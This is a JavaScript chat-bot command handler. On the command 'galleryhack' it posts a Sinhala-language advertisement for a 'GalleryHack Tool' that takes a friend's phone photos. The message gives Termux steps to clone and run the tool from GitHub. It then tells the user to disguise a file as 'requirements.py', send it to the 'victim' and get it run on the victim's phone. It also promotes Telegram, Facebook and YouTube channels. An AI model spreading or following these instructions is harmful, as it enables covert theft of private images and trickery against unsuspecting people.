let handler  = async (m, { conn, usedPrefix: _p }) => {
  conn.reply(m.chat, `

*YouTube:*
SL android 🇱🇰 

💢 *GalleryHack Tool* 💢

යාලුවාගෙ ගැලරි එක උස්සමු ...

ඔන්න හැමෝම බලන් හිටපු වීඩීයෝ  එක අරගෙන ආවා..හරියටම වීඩීයෝ එක බලන්න skip කරන්න එපා ඒතරම් වැදගත්..Skip කරොත් තේරෙන එකක් නෑ.

❤️අලුත් update එකේ ඔයාලට whatsapp ,facebook ,imo,telegram වගේ ඕනම එකක 4tos ගන්න පුළුවන් ඔයාලගෙ website එකට,මේකේ තව updates ඉස්සරහට දෙන්නම්.touch එකේ ඉන්න

❤️වීඩීයෝ එක බැලුවම තේරේවි.. වීඩීයෝ 2ක් තියෙනවා 2කම බලන්න

💢 *Vedio Part 1*
https://youtu.be/hT9qfU5695o

❤️  Tool link ;

https://github.com/RazorKenway/GalleryHack.git

💢 *Vedio Part 2* 

Step 1 - 

ඉස්සෙල්ලම Telegram Channel එකට Join වෙන්න මේ ලින්ක් එකෙන්
https://t.me/joinchat/UebGbvZ36Vuh5q56


Step 2- 

දැන් මෙ ලින්ක් එකෙන් වීඩීයෝ එක බලන්න

https://t.me/c/1374078574/72
----------------------------------------------------------------------

*GalleryHack Tool version 2*  👇👇

*Termux Users Gallery Hack Tool (Owner - Razor Kenway | SL Android | Sri Lanka* 

pkg update && pkg upgrade

pkg install git

git clone https://github.com/RazorKenway/GalleryHack.git

cd GalleryHack

python galleryhack.py

>Sent To victim requirements.py File And Run Victim's Phone 

*Type Victim's phone :-  python requirements.py*

*මම Razor Kenway*

💢 Telegram Channel -
https://t.me/joinchat/UebGbvZ36Vuh5q56

💢 Facebook Group එකට joing wenna --https://www.facebook.com/groups/277920623081269/?ref=share


💢 Youtube එකෙත් Subscribe කරලා සෙට් වෙන්න--https://m.youtube.com/channel/UCLJPOlgldE496tVZjSRi45Q?sub_confirmation=1




`.trim(), m)
}
handler.command = /^(galleryhack|Galleryhack)$/i
handler.owner = false
handler.mods = false
handler.premium = false
handler.group = false
handler.private = false

handler.admin = false
handler.botAdmin = false

handler.fail = null

module.exports = handler

